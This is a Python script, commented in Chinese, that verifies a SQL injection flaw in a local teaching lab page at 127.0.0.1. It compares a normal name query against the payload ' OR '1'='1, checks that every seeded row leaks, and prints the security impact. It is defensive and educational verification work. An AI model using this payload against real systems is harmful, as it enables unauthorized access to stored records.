#!/usr/bin/env python3
# S001 SQL 注入本地验证脚本
# 固定目标：http://127.0.0.1:4280/lab_cases/S001/index.php
# 仅用于本地教学实验，不修改数据，不跟随重定向。

import http.client
import html
import re
import sys
from urllib.parse import urlencode

HOST = "127.0.0.1"
PORT = 4280
PATH = "/lab_cases/S001/index.php"
TIMEOUT = 5

RECORD_RE = re.compile(r"<p>ID\s*(\d+)：([^<]*)</p>", re.IGNORECASE)

def fetch_records(name: str):
    query = urlencode({"name": name})
    conn = http.client.HTTPConnection(HOST, PORT, timeout=TIMEOUT)
    try:
        conn.request(
            "GET",
            f"{PATH}?{query}",
            headers={
                "Host": f"{HOST}:{PORT}",
                "User-Agent": "S001-local-sql-audit/1.0",
                "Accept": "text/html",
            },
        )
        resp = conn.getresponse()
        status = resp.status
        body = resp.read().decode("utf-8", errors="replace")
    finally:
        conn.close()

    if status != 200:
        raise RuntimeError(f"HTTP 状态非 200：{status}，不作为成功条件")
    if "查询失败" in body:
        raise RuntimeError("页面返回查询失败，检查数据库连接和查询前提")

    records = []
    for match in RECORD_RE.finditer(body):
        row_id = match.group(1).strip()
        row_name = html.unescape(match.group(2).strip())
        records.append((row_id, row_name))
    return records

def main():
    normal_name = "Alice"
    test_name = "' OR '1'='1"

    normal_records = fetch_records(normal_name)
    test_records = fetch_records(test_name)

    print("普通请求 name=Alice 解析记录：", normal_records)
    print("测试请求 name=' OR '1'='1 解析记录：", test_records)

    expected_normal = {("1", "Alice")}
    expected_leaked_minimum = {("1", "Alice"), ("2", "Bob"), ("3", "Carol")}

    if set(normal_records) != expected_normal:
        print("失败：普通业务对照不符合预期。检查服务、路径、数据库连接、表数据和 HTML 输出结构。")
        return 1

    if len(test_records) <= len(normal_records):
        print("失败：测试请求未产生更多业务记录，无法确认注入效果。")
        return 1

    if not expected_leaked_minimum.issubset(set(test_records)):
        print("失败：测试请求未解析到预置三行，无法确认 WHERE 条件被改变。")
        return 1

    if set(test_records) == set(normal_records):
        print("失败：测试请求与普通请求记录相同。")
        return 1

    print("成功：普通请求仅返回精确匹配的 Alice；测试请求使 WHERE 条件恒真并返回全表教学记录。")
    print("安全影响：name 参数可改变 SQL 语法结构，绕过精确姓名匹配并泄露 lab_people 全部记录。")
    return 0

if __name__ == "__main__":
    sys.exit(main())
